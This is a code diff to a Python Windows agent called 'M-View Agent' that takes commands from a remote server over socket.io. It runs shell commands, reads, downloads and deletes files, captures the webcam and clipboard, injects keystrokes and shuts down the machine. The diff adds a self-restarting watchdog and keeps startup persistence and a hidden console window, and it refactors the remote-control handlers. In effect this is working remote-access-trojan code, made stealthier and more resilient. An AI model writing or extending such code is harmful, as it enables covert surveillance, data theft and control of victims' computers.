-                            subprocess.Popen(["powershell", "-Command",
+                            subprocess.Popen(["powershell","-Command",
                                 "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                 creationflags=subprocess.CREATE_NO_WINDOW)
                         elif ktype in ("down", "press"):
-                            # Map JS key names → pyautogui key names
-                            key_map = {
-                                "Enter": "enter", "Backspace": "backspace", "Tab": "tab",
-                                "Escape": "esc", "Delete": "delete", "Insert": "insert",
-                                "Home": "home", "End": "end", "PageUp": "pageup",
-                                "PageDown": "pagedown", "ArrowUp": "up", "ArrowDown": "down",
-                                "ArrowLeft": "left", "ArrowRight": "right",
-                                "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5",
-                                "F6":"f6","F7":"f7","F8":"f8","F9":"f9","F10":"f10",
-                                "F11":"f11","F12":"f12", " ": "space",
-                                "Control": "ctrl", "Alt": "alt", "Shift": "shift",
-                                "Meta": "win",
-                            }
-                            pg_key = key_map.get(key, key.lower() if len(key)==1 else None)
-                            if pg_key:
+                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
+                            if pg:
                                 hotkey = []
-                                if data.get("ctrl")  and key not in ("Control",): hotkey.append("ctrl")
-                                if data.get("alt")   and key not in ("Alt",):     hotkey.append("alt")
-                                if data.get("shift") and key not in ("Shift",):   hotkey.append("shift")
-                                hotkey.append(pg_key)
+                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
+                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
+                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
+                                hotkey.append(pg)
                                 if len(hotkey) > 1:
                                     pyautogui.hotkey(*hotkey, _pause=False)
                                 else:
-                                    pyautogui.keyDown(pg_key, _pause=False)
+                                    pyautogui.keyDown(pg, _pause=False)
                         elif ktype == "up":
-                            key_map2 = {"Control":"ctrl","Alt":"alt","Shift":"shift","Meta":"win"}
-                            pg_key = key_map2.get(key, key.lower() if len(key)==1 else None)
-                            if pg_key:
-                                pyautogui.keyUp(pg_key, _pause=False)
+                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
+                            if pg:
+                                pyautogui.keyUp(pg, _pause=False)
                     except Exception as e:
-                        log.warning(f"key_event error: {e}")
+                        log.warning(f"key_event: {e}")
 
+            # ── Ping ───────────────────────────────────────────────────────
             elif tab == "ping":
-                # Respond immediately so dashboard can measure latency
                 sio.emit("ping_result", {"device_id": CONFIG["DEVICE_TOKEN"], "t": data.get("t")})
 
-            elif tab == "monitor":
-                # Start or stop screen stream
-                action = data.get("action", "start")
-                if action == "start":
-                    self.streamer.start(
-                        monitor=data.get("monitor", 1),
-                        fps=data.get("fps", CONFIG["STREAM_FPS"]),
-                        quality=data.get("quality", CONFIG["STREAM_QUALITY"]),
-                    )
-                else:
-                    self.streamer.stop()
-
+            # ── System ────────────────────────────────────────────────────
             elif tab == "system":
-                # Start continuous system telemetry
                 action = data.get("action", "start")
-                if action == "start":
-                    self.sys_monitor.start(interval=data.get("interval", 2))
-                else:
-                    self.sys_monitor.stop()
+                if action == "start": self.sys_monitor.start(interval=data.get("interval", 2))
+                else:                 self.sys_monitor.stop()
 
             elif tab == "system_snapshot":
-                # One-shot system stats
-                stats = self.sys_monitor.get_snapshot()
-                sio.emit("system_stats_report", stats)
+                sio.emit("system_stats_report", self.sys_monitor.get_snapshot())
 
             elif tab == "disks":
-                sio.emit("disks_report", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "disks":     self.sys_monitor.get_disk_list(),
-                })
+                sio.emit("disks_report",   {"device_id": CONFIG["DEVICE_TOKEN"], "disks":      self.sys_monitor.get_disk_list()})
 
             elif tab == "network":
-                sio.emit("network_report", {
-                    "device_id":    CONFIG["DEVICE_TOKEN"],
-                    "interfaces":   self.sys_monitor.get_network_interfaces(),
-                })
+                sio.emit("network_report", {"device_id": CONFIG["DEVICE_TOKEN"], "interfaces": self.sys_monitor.get_network_interfaces()})
 
+            # ── Processes ─────────────────────────────────────────────────
             elif tab == "processes":
                 procs = self.proc_mgr.list_processes()
-                sio.emit("processes_report", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "processes": procs,
-                    "count":     len(procs),
-                })
+                sio.emit("processes_report", {"device_id": CONFIG["DEVICE_TOKEN"], "processes": procs, "count": len(procs)})
 
             elif tab == "kill_process":
-                result = self.proc_mgr.kill_process(int(data.get("pid", 0)))
-                sio.emit("kill_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("kill_result",    {"device_id": CONFIG["DEVICE_TOKEN"], **self.proc_mgr.kill_process(int(data.get("pid", 0)))})
 
             elif tab == "start_process":
-                result = self.proc_mgr.start_process(data.get("command", ""))
-                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **self.proc_mgr.start_process(data.get("command", ""))})
 
+            # ── Shell ─────────────────────────────────────────────────────
             elif tab == "shell":
-                result = self.shell.execute(
-                    data.get("command", "echo hello"),
-                    shell_type=data.get("shell_type", "cmd"),
-                )
+                result = self.shell.execute(data.get("command", "echo hello"), shell_type=data.get("shell_type", "cmd"))
                 sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
 
+            # ── Files ─────────────────────────────────────────────────────
             elif tab == "file_list":
-                path = data.get("path", "C:\\")
-                result = self.files.list_directory(path)
-                sio.emit("file_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("file_list_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.list_directory(data.get("path", "C:\\"))})
 
             elif tab == "file_read":
-                result = self.files.read_file(data.get("path", ""))
-                sio.emit("file_read_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("file_read_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.read_file(data.get("path", ""))})
 
             elif tab == "file_download":
-                result = self.files.download_file(data.get("path", ""))
-                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.download_file(data.get("path", ""))})
 
             elif tab == "file_delete":
-                result = self.files.delete_file(data.get("path", ""))
-                sio.emit("file_delete_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("file_delete_result",   {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.delete_file(data.get("path", ""))})
 
             elif tab == "drives":
-                sio.emit("drives_report", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "drives":    self.files.list_drives(),
-                })
+                sio.emit("drives_report", {"device_id": CONFIG["DEVICE_TOKEN"], "drives": self.files.list_drives()})
 
+            # ── Webcam ────────────────────────────────────────────────────
             elif tab == "webcam":
-                result = self.webcam.capture(camera_idx=data.get("camera", 0))
-                sio.emit("webcam_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
+                sio.emit("webcam_result",      {"device_id": CONFIG["DEVICE_TOKEN"], **self.webcam.capture(data.get("camera", 0))})
 
             elif tab == "webcam_list":
-                cameras = self.webcam.list_cameras()
-                sio.emit("webcam_list_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "cameras":   cameras,
-                })
+                sio.emit("webcam_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], "cameras": self.webcam.list_cameras()})
 
+            # ── Clipboard ─────────────────────────────────────────────────
             elif tab == "clipboard_get":
-                if CLIPBOARD_AVAILABLE:
-                    content = pyperclip.paste()
-                    sio.emit("clipboard_result", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "content":   content[:4096],
-                        "ts":        datetime.utcnow().isoformat(),
-                    })
+                if CLIPBOARD_OK:
+                    sio.emit("clipboard_result", {"device_id": CONFIG["DEVICE_TOKEN"], "content": pyperclip.paste()[:4096], "ts": datetime.utcnow().isoformat()})
 
             elif tab == "clipboard_set":
-                if CLIPBOARD_AVAILABLE:
-                    text = data.get("text", "")
-                    pyperclip.copy(text)
-                    sio.emit("clipboard_set_result", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "success":   True,
-                    })
+                if CLIPBOARD_OK:
+                    pyperclip.copy(data.get("text", ""))
+                    sio.emit("clipboard_set_result", {"device_id": CONFIG["DEVICE_TOKEN"], "success": True})
 
+            # ── Power ─────────────────────────────────────────────────────
             elif tab == "lock_screen":
                 ctypes.windll.user32.LockWorkStation()
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action":    "lock_screen",
-                    "success":   True,
-                })
+                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "lock_screen", "success": True})
 
             elif tab == "sleep":
                 sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "sleep", "success": True})
@@ -1216,13 +1387,11 @@ class MViewAgent:
 
             elif tab == "shutdown":
                 sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "shutdown", "success": True})
-                time.sleep(1)
-                os.system("shutdown /s /t 10 /c \"M-View remote shutdown\"")
+                time.sleep(1); os.system("shutdown /s /t 10 /c \"M-View remote shutdown\"")
 
             elif tab == "restart":
                 sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "restart", "success": True})
-                time.sleep(1)
-                os.system("shutdown /r /t 10 /c \"M-View remote restart\"")
+                time.sleep(1); os.system("shutdown /r /t 10 /c \"M-View remote restart\"")
 
             elif tab == "abort_shutdown":
                 os.system("shutdown /a")
@@ -1234,11 +1403,11 @@ class MViewAgent:
                 sys.exit(0)
 
             else:
-                log.warning(f"Unknown tab action: {tab}")
+                log.warning(f"Unknown tab: {tab}")
 
-    # ── Connection Loop ───────────────────────────────────────────
+    # ── Connection Loop — exponential backoff with jitter ─────────────────
     def run(self):
-        log.info("M-View Agent v3.0 starting…")
+        log.info(f"M-View Agent v{CONFIG['AGENT_VERSION']} starting…")
         install_persistence()
         time.sleep(CONFIG["STARTUP_DELAY"])
 
@@ -1248,13 +1417,13 @@ class MViewAgent:
                     log.info(f"Connecting to {CONFIG['SERVER_URL']}…")
                     self.sio.connect(
                         CONFIG["SERVER_URL"],
-                        transports=["websocket"],
-                        wait_timeout=15,
+                        transports=["websocket", "polling"],  # polling fallback for proxies
+                        wait_timeout=20,
                     )
                     self.sio.wait()
 
             except socketio.exceptions.ConnectionError as e:
-                log.warning(f"Connection failed: {e}")
+                log.warning(f"Connection error: {e}")
             except Exception as e:
                 log.error(f"Agent error: {e}")
             finally:
@@ -1263,23 +1432,56 @@ class MViewAgent:
                 self.sys_monitor.stop()
                 self.heartbeat.stop()
 
-            # Exponential backoff
-            log.info(f"Reconnecting in {self._reconnect_delay}s…")
-            time.sleep(self._reconnect_delay)
+            # Exponential backoff + jitter (prevents thundering herd on server restart)
+            jitter = random.uniform(0, self._reconnect_delay * 0.3)
+            delay  = self._reconnect_delay + jitter
+            log.info(f"Reconnecting in {delay:.1f}s…")
+            time.sleep(delay)
             self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])
 
 
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  WATCHDOG — restarts agent if main thread dies
+# ════════════════════════════════════════════════════════════════════════════
+def _watchdog(agent_ref: list):
+    """
+    Runs in a separate thread. If the agent's main thread exits unexpectedly,
+    creates a new agent instance and restarts.
+    """
+    time.sleep(30)   # give agent time to start
+    while True:
+        time.sleep(60)
+        t = agent_ref[0]
+        if t and not t.is_alive():
+            log.warning("Watchdog: agent thread died — restarting…")
+            try:
+                new_agent  = MViewAgent()
+                new_thread = threading.Thread(target=new_agent.run, daemon=False)
+                new_thread.start()
+                agent_ref[0] = new_thread
+            except Exception as e:
+                log.error(f"Watchdog restart failed: {e}")
+
+
+# ════════════════════════════════════════════════════════════════════════════
 #  ENTRY POINT
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 if __name__ == "__main__":
-    # Hide console window (redundant with --noconsole but safe)
+    # Hide console window (--noconsole handles it, but this is the safe fallback)
     try:
-        ctypes.windll.user32.ShowWindow(
-            ctypes.windll.kernel32.GetConsoleWindow(), 0
-        )
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except Exception:
         pass
 
     agent = MViewAgent()
-    agent.run()
+
+    # Start agent in its own thread so watchdog can monitor it
+    agent_thread = threading.Thread(target=agent.run, daemon=False, name="mview-main")
+    agent_ref    = [agent_thread]
+    agent_thread.start()
+
+    # Start watchdog
+    watchdog_thread = threading.Thread(target=_watchdog, args=(agent_ref,), daemon=True, name="mview-watchdog")
+    watchdog_thread.start()
+
+    agent_thread.join()
